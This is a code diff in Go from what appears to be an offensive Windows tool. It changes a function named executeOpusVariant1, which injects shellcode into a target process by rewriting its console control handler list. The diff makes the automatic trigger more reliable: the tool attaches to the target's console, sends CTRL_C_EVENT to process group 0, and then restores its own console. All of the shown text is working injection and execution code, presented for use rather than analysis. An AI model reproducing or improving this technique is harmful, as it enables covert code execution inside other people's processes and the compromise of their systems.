@@ -53,6 +53,7 @@ var (
 	ntdllOpus                       = windows.NewLazySystemDLL("ntdll.dll")
 	procAttachConsole               = kernel32.NewProc("AttachConsole")
 	procFreeConsole                 = kernel32.NewProc("FreeConsole")
+	procAllocConsole                = kernel32.NewProc("AllocConsole")
 	procGenerateConsoleCtrlEvent    = kernel32.NewProc("GenerateConsoleCtrlEvent")
 	procNtQueryInformationProcessOp = ntdllOpus.NewProc("NtQueryInformationProcess")
 )
@@ -276,33 +277,37 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] Updated HandlerListLength: %d -> %d\n", handlerCount, newCount)
 
 	// Step 13: Detach from our console (if any) and attach to target
+	// Save whether we had a console originally
 	procFreeConsole.Call()
 
 	ret, _, attachErr := procAttachConsole.Call(uintptr(pid))
 	if ret == 0 {
 		// Try to restore original handler count before failing
 		writeProcessMemoryDword(hProcess, handlerListLengthAddr, handlerCount)
+		// Try to restore our console
+		procAllocConsole.Call()
 		return output, fmt.Errorf("AttachConsole failed: %v (target may not be a console process)", attachErr)
 	}
 	output += "[+] Attached to target console\n"
 
 	// Step 14: Generate Ctrl+C event
-	// Try using target PID as process group ID
-	// This may fail if the process wasn't started with CREATE_NEW_PROCESS_GROUP
+	// Use process group 0 to send to all processes on the CURRENT console
+	// Since we're now attached to the target's console, this sends to the target!
 	ret, _, ctrlErr := procGenerateConsoleCtrlEvent.Call(
 		uintptr(CTRL_C_EVENT),
-		uintptr(pid),
+		0, // 0 = all processes on current console (which is now the target's)
 	)
 	if ret == 0 {
 		output += fmt.Sprintf("[!] GenerateConsoleCtrlEvent failed: %v\n", ctrlErr)
 		output += "[*] Handler installed but auto-trigger failed.\n"
 		output += "[*] MANUAL TRIGGER: Press Ctrl+C in the target console window to execute shellcode.\n"
 	} else {
-		output += fmt.Sprintf("[+] Generated CTRL_C_EVENT to process group %d\n", pid)
+		output += "[+] Generated CTRL_C_EVENT to target console\n"
 	}
 
-	// Detach from target console
+	// Detach from target console and restore our own
 	procFreeConsole.Call()
+	procAllocConsole.Call()
 
 	output += "[+] Opus Injection Variant 1 completed\n"
 	output += fmt.Sprintf("[*] Handler installed at slot %d. Shellcode will execute on Ctrl+C.\n", handlerCount)
